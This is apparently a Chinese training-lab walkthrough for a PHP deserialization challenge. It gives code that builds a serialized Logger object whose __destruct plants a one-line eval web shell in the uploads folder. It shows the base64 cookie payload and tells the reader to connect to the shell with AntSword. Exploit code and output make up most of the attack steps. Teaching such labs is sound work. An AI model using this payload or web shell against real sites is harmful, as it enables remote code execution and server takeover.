思路提示

反序列化的核心是Cookie 中的序列化数据可控，服务端 unserialize() 还原时会触发类的魔术方法。思路：找到能利用的魔术方法链（本关是 Logger::__destruct 写文件），构造一个序列化对象，设置好目标文件路径和内容，base64 编码后替换 Cookie。注意 __destruct 在请求结束时执行，且 PHP 会把工作目录重置，所以写文件必须用绝对路径。

详细解题过程（点击展开）
利用思路：Cookie 完全可控 → 构造 Logger 对象序列化串 → base64 → 替换 Cookie → 页面结束 __destruct 自动写文件。
第一步 - 生成 payload（logfile 必须是上传目录的绝对路径，下方 {{UPLOAD_DIR}} 会替换为本靶场的实际上传目录）： 
<?php
class Logger {
    public $logfile = '{{UPLOAD_DIR}}/uns_shell.php';
    public $msg = '<?php @eval($_POST[cmd]);?>';
}
echo base64_encode(serialize(new Logger()));
示例输出（部署路径取 D:/phpStudy/WWW/bafanglab 时）： 
Tzo2OiJMb2dnZXIiOjI6e3M6NzoibG9nZmlsZSI7czo0NzoiRDovcGhwU3R1ZHkvV1dXL2JhZmFuZ2xhYi91cGxvYWRzL3Vuc19zaGVsbC5waHAiO3M6MzoibXNnIjtzOjI3OiI8P3BocCBAZXZhbCgkX1BPU1RbY21kXSk7Pz4iO30=
对应的序列化原文： 
O:6:"Logger":2:{s:7:"logfile";s:47:"D:/phpStudy/WWW/bafanglab/uploads/uns_shell.php";s:3:"msg";s:27:"<?php @eval($_POST[cmd]);?>";}
（base64 里的长度标记 s:47、s:27 与真实字符串长度必须一致。把 D:/phpStudy/WWW/bafanglab 换成为你自己的安装路径后，路径长度会变，需按上面的代码重新生成整串，不能只改路径不改数字）
第二步 - 替换 Cookie：F12 或 Burp 把 prefs Cookie 改成上面的 base64 整串，刷新本页。
重要：base64 中若含 + 或 =，放入 Cookie 前必须 URL 编码 （+ → %2B，= → %3D），否则 PHP 解析 Cookie 时 + 变空格，payload 损坏；本例末尾的 = 编码为 %3D 更稳妥。
第三步 - 验证：刷新后页面提示"偏好对象已反序列化（非 UserPrefs 类型）"，uploads/uns_shell.php 被写入，内容为 <?php @eval($_POST[cmd]);?>；
访问 {{SITE}}/uploads/uns_shell.php 用蚁剑连接（URL 同上，连接密码 cmd，编码器默认）。
教学点：PHP 在请求关闭阶段执行 __destruct 前会把工作目录重置为 PHP 安装目录，
所以 __destruct 中使用相对路径写文件往往会"写丢"——真实漏洞利用时一律用绝对路径。
